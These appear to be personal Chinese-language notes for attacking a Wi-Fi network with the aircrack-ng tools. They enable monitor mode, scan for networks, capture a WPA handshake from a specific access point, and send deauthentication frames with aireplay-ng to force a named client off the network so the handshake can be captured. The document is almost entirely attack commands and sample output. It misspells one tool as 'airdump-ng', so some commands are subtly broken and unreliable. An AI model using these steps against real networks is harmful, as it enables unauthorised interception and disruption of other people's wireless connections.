
被动方式
```sh
ifconfig # 查看 wlan0 无线网卡
airmon-ng # 查看是否支持监听模式 显示wlan0 支持
airmon-ng start wlan0 # 开启监听

airdump-ng wlan0 # 扫描 wifi

# BSSID             PWR   Beacons	CH  # CH wifi频段11
# 60:32:B1:56:3F:B2 -32   24      11
# BSSID              STATTION
# 60:32:B1:56:3F:B2  CC:08:FB:DD:42:18

airdump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/lingdu/handshake wlan0

# CH 11 Elasped : 3 mins ... [WPA handshake -- 显示 handshake 为攻击成功, 这时Ctrl+C退出命令
```

ACK方式
```sh
# 上面的不要关闭
aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c CC:08:FB:DD:42:18 wlan0
# -0: 通知设备断开连接 10: 攻击次数 -a:目标bssid -c: 目标踢下线的设备
```